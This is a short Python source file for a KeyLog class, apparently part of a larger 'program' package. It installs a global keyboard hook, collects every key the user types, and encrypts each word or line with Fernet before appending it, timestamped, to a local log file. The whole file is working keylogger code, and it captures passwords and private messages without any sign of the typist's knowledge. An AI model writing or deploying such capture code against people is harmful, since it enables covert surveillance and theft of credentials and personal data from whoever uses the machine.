from program.service import Service
from cryptography.fernet import Fernet
from datetime import datetime
import keyboard
import pytz

class KeyLog(Service):
    def __init__(
                self,
                base_dir='log',
                key=None,
                file_name='Activities.txt'):
        '''
        args:
            base_dir: Directory where the input or output files will be stored
            key: Secret Key for encryption and decryption
        '''
        super().__init__(base_dir, key, file_name)
        self.jumps = ["space", "enter", "return", "delete"]
        self.text = []
        self.fernet = Fernet(self.key)

        keyboard.on_press(self.key_pressed)
        keyboard.wait()


    def key_pressed(self, event):
        '''
        args:
            event: Event of Key pressed on keyboard
        '''
        current_time = datetime.now(pytz.timezone('America/Guatemala'))
        
        with open(self.file_name, 'a+') as file:
            # If event is in jump list...
            if event.name in self.jumps:
                # Join the content in array
                full_text = ''.join(self.text)
                # encrypt text
                encrypt_text = self.fernet.encrypt(full_text.encode())
                # Write in document datetime and encrypted text
                file.write('{},{}\n'.format(
                    current_time,
                    encrypt_text.decode()
                ))
                # clear text array
                self.text.clear()
            
            elif event.name == "backspace":
                # Write backspace on file
                file.write('{},{}'.format(current_time, event.name))

            else:
                # Append key in {text} array
                self.text.append(event.name)